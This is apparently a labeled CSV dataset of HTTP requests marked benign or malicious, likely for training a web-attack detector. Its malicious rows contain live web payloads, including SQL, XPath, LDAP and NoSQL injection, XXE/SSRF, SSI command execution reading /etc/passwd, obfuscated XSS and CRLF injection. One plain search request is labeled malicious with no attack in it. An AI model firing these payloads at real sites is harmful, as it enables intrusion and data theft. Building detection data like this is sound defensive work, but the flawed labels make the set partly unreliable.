label,text
benign,"POST /account/settings/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Connection: keep-alive
Origin: https://online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://online-retail-store.biz/account/settings
Accept-Encoding: gzip, deflate, br

email=emma.jones%40retailmail.biz&phone=+1234567890&callback=%2Faccount%2Fprofile%2Fview"
benign,"POST /password/reset HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: close
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.9
Origin: https://api.cloud-data-services.ai
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15

email=martin.bradshaw%40cloudmail.ai"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: datasync.prod-system-cloud.co
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Content-Length: 50
X-Requested-With: XMLHttpRequest
Referer: https://datasync.prod-system-cloud.co/dashboard
Connection: keep-alive

[
  { ""op"": ""replace"", ""path"": ""/sync/autoSync"", ""value"": false }
]"
benign,"POST /user/update HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer m7TrXoa28v9bhLLQ2u6Wkgd45JNTZpqk
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Length: 100

{""username"":""travis89"",""email"":""travis89@secure-user-portal.net"",""isAdmin"":false,""profileVisibility"":""friends_only""}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.marketplace-portal.net
Content-Type: application/json
Content-Length: 114
Accept: application/json
X-CSRF-Token: 673e1abc32f8431e8adf4691135f572f
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36

{""searchTerm"": ""Electronics' AnD (SeLeCt CoUnT(*) From users) > 5 --""}"
benign,"GET /api/v2/resources/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: api.smart-fintech-solutions.ai
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate, br
Connection: close"
malicious,"GET /search?q=widgets HTTP/1.1
Host: frontend-cache-server.webstore.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"OPTIONS /v4/content/post HTTP/1.1
Host: socialmediaapi.my-personal-blog-site.info
Origin: https://liveedit.admin-panel.net
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type, x-api-key
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json"
benign,"POST /profile/comments/add HTTP/1.1
Host: data-secure-access.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 204
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7

comment=When+using+the+%3Cscript%3E+tag,+remember+that+embedding+JS+like+var+x+%3D+document.getElementById('id')+is+very+common+in+client-side+scripting."
malicious,"POST /api/upload/profilePicture HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 105
Accept: application/json
User-Agent: Wget/1.21.1
X-CSRF-Token: d597fbd9a86e427f899a68f5b064db2d

{""userId"": ""7890"", ""imageName"": ""profile.png"", ""description"": ""Profile image' Or '0'='0""}"
benign,"POST /polls/castvote HTTP/1.1
Host: neighborhood-voices.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Referer: https://neighborhood-voices.info/polls
Connection: keep-alive

poll_id=56&choice_id=4"
benign,"GET /forums/thread/2135 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.9
Cookie: view_opts_b64=eyJsYXlvdXQiOiJkYXJrIiwibGltaXQiOjUwfQ==; logged_in=true
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
malicious,"POST /file/lookup HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json
Content-Length: 55

{""filePath"": ""C:\\Windows\\System32\\drivers\\etc\\hosts""}"
benign,"POST /contact/send HTTP/1.1
Host: helpdesk-support-center.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: https://helpdesk-support-center.io
Referer: https://helpdesk-support-center.io/contact
Cookie: sessionid=fcb329a057a14a29a3bc4cff7db9932d; _ga=GA1.2.1245789367.1686220001
Connection: keep-alive

name=Linda+Waters&email=linda.waters%40mailnova.net&subject=Account+Assistance&message=Hello%2C+I+need+help+with+updating+my+account+details.+Thank+you."
malicious,"GET /app/user/profile?redirect=https%3A%2F%2Fmyvault-crypto.biz%2Fdashboard%3Fdata%3Dload%250d%250aSet-Cookie%3A%20token%3Dxyz123%3B%20Secure HTTP/1.1
Host: identity-auth-center.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"GET /products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://online-retail-store.biz/
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36 Edg/114.0.1823.67"
benign,"POST /contact-us/send-message HTTP/1.1
Host: greenhorizons.ag
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://greenhorizons.ag/contact-us
Origin: https://greenhorizons.ag
Cookie: _gh_session=2439a3769b7cab8e06bf0d517eb43ec6

name=Anna+Becker&email=anna.becker%40greenmail.ag&subject=Volunteer+Opportunities&message=I+am+interested+in+volunteering+for+upcoming+events.+Please+send+more+information."
malicious,"POST /api/v2/submit-feedback HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/xml
Accept: application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Content-Length: 219
Connection: close

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:8080/admin_panel"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"GET /search/results?query=how%20to%20bake%20bread HTTP/1.1
Host: fresh-food-guides.edu
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Connection: close"
benign,"GET /blog/2024/06/tech-update HTTP/1.1
Host: my-personal-blog-site.info
Cookie: visitor_id=hn4g7jf60jk1; last_read_post=2024-06-10-article-123; newsletter_subscribed=true
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Connection: keep-alive"
malicious,"POST /api/v3/user/redirect HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json, text/html;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Cache-Control: max-age=0
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
malicious,"GET /content/news.shtml?template_name=main<!--#exec%20cmd=""cat%20/etc/passwd""--> HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.75.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"HEAD /community/forums/topic/3421 HTTP/1.1
Host: game-dev-network.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Referer: https://game-dev-network.org/community/forums
Connection: keep-alive"
benign,"POST /api/v1/feedback HTTP/1.1
Host: online-tech-forums.net
Content-Type: application/x-www-form-urlencoded
Content-Language: en-US
Accept: text/html,application/xhtml+xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Referer: https://online-tech-forums.net/forums/56789
Content-Length: 89
Connection: keep-alive

username=bryan_k&email=bryan.k%40tech-forums.net&feedback=The+new+layout+is+user-friendly+and+very+responsive."
benign,"POST /api/xml/createProject HTTP/1.1
Host: project-collab.community-platform.dev
Authorization: Bearer 1e9b27e6acda44b8a38102fc9d0fa0b2
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Length: 176
Connection: close

<ProjectCreate>
  <projectName>Open Source Mobile App</projectName>
  <description>Development of cross-platform mobile application for note-taking.</description>
  <owner>cassandra_jones</owner>
  <startDate>2024-06-15</startDate>
  <priority>Medium</priority>
</ProjectCreate>"
benign,"POST /api/device/config HTTP/1.1
Host: smart-home-hub.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/json
Accept: application/json
Content-Length: 74
X-Forwarded-For: 192.168.22.45
Connection: keep-alive

{""device_name"":""light-controller"",""set_mode"":""eco-save"",""commands"":[""dim_50"",""auto_off""]}"
benign,"GET /stories/sports/championship-finals-2024 HTTP/1.1
Host: competitive-sports-arena.org
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Pragma: no-cache"
malicious,"POST /api/metadata/update HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 339
Origin: https://admin.online-retail-store.biz
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""inventory-update"",
  ""sku"": ""ZA-345-BLK"",
  ""stock"": 65,
  ""last_modified"": ""2024-06-02T18:45:00Z""
}"
benign,"OPTIONS /api/v1/articles/submit HTTP/1.1
Host: content-management-platform.io
Origin: https://editor.blog-social-network.org
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /session/start HTTP/1.1
Host: enterprise-app-solutions.tech
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Content-Length: 80
Connection: keep-alive
Cookie: sid=3e2f1a4b5c6d7e8f9a0b1c2d3e4f5a6b

username=manager' and substring(concat(//employees/employee[1]/pin,'#'),1,1)='9&password=topsecret"
malicious,"PUT /v1/account/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImFsaWNlQG1haWxzZXJ2aWNlcy5jb20iLCJpYXQiOjE2MzAwMDAwMDB9.QqZPcv5uK9VzQ7iJx7kVXT7f1B3E6a8X2n6b4Uo2L5w
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br

{""user_details"":{""name"":""attacker"",""address"":""123 evil st""},""account_info"":{""subscription_level"":""premium"",""override_settings"":{""is_feature_xyz_enabled"":true,""credits_override"":99999}}}"
malicious,"POST /edit-profile HTTP/1.1
Host: social-connect-platform.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: https://social-connect-platform.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
X-Requested-With: FetchAPIClient

description=Just+a+social+butterfly.+<!--#INCLUDE file=""/etc/environment""-->"
benign,"GET /api/v1/catalog/items?category=electronics&available=true&sort=price_desc&limit=25 HTTP/1.1
Host: api.online-retail-store.biz
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...sign
Accept-Language: en-GB,en;q=0.8"
benign,"GET /products/electronics/portable-speaker/details HTTP/1.1
Host: shopwave-online.biz
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html
DNT: 1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"GET /status HTTP/1.1
Host: backend-core-ops.io
User-Agent: Prometheus/2.31.1
Accept: application/json"
benign,"POST /register HTTP/1.1
Host: secure-user-portal.net
User-Agent: python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2441
Accept-Encoding: gzip, deflate
Connection: keep-alive

username=andrewsarah&password=********&email=sarah.andrew%40secureuserportal.net&profile_description=With+over+seven+years+of+experience+in+digital+marketing%2C+I+have+developed+a+deep+understanding+of+SEO%2C+content+strategy%2C+and+social+media+campaigns.+My+career+has+been+marked+by+successful+project+leadership+that+resulted+in+significant+growth+for+a+variety+of+clients+across+industries.+I+believe+in+data-driven+decision-making+and+am+constantly+updating+my+skills+to+stay+ahead+of+market+trends.+Joining+this+platform+will+allow+me+to+connect+with+like-minded+professionals+and+expand+my+opportunities+for+collaboration.+I+look+forward+to+contributing+to+the+community%27s+shared+knowledge.&referrer=https%3A%2F%2Fpartner-network.co%2Fwelcome"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: analytics.internal-dashboard.io
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 74

{""reportUrl"":""http://2130706433/admin/dashboard?refresh=true&user=admin""}"
malicious,"POST /graphql/query HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 202
Connection: close

{""query"":{""$where"":""this.role == 'superuser' && this.key.startsWith('abc') || sleep(4000)""},""projection"":{""username"":1,""email"":1}}"
malicious,"POST /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 54
data_source=dict%3A%2F%2Flocalhost%3A8080%2Fstatus"
malicious,"GET /auth/ldap_login?user=%2A%29%28title%3Dmanager%29%29%7C%28sn%3DSmith%29 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/v1/profile/update HTTP/1.1
Host: users.secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.bXVzaWNyZXRvcmQ.Kt2-JTYNqc7GGHd_Epjwf9UbZgMYkVlapnaA7RwHDRg
X-CSRF-Token: abcd1234efgh5678ijkl9012
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://secure-user-portal.net/dashboard

{""userId"":462,""profileUpdates"":{""displayName"":""AliceS"",""location"":""Seattle, WA"",""newsletterSubscribed"":true}}"
benign,"POST /api/v1/orders/create HTTP/1.1
Host: order-management-system.cloud
Content-Type: application/xml
Content-Length: 136
Accept: application/xml, text/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive

<order>
  <customer>Linda Barrett</customer>
  <productID>5698</productID>
  <quantity>2</quantity>
  <priority>standard</priority>
</order>"
benign,"POST /oauth/token HTTP/1.1
Host: identity-cloud-services.tech
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Authorization: Basic dGVjaGluZUBjbGllbnQ6c2VjdXJlMTIz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: application/json, text/plain, */*
Connection: keep-alive

grant_type=authorization_code&code=QWERTYUI123&redirect_uri=https%3A%2F%2Fclient.identity-cloud-services.tech%2Flogin%2Fcallback&client_id=techineClient&client_secret=secure123"
benign,"GET /articles/health-and-wellness/mindfulness-practices HTTP/1.1
Host: mindful-living-resources.info
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, br, deflate
Cache-Control: max-age=3600
Connection: close"
benign,"POST /support/message HTTP/1.1
Host: customer-care.globalshippings.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Referer: https://customer-care.globalshippings.io/support/contact
Origin: https://customer-care.globalshippings.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: close

name=Emily+Simmons&email=esimmons%40globalshippings.io&subject=Shipping+Delay&message=My+recent+order+hasn%27t+arrived+yet.+Can+you+please+check+its+status%3F"
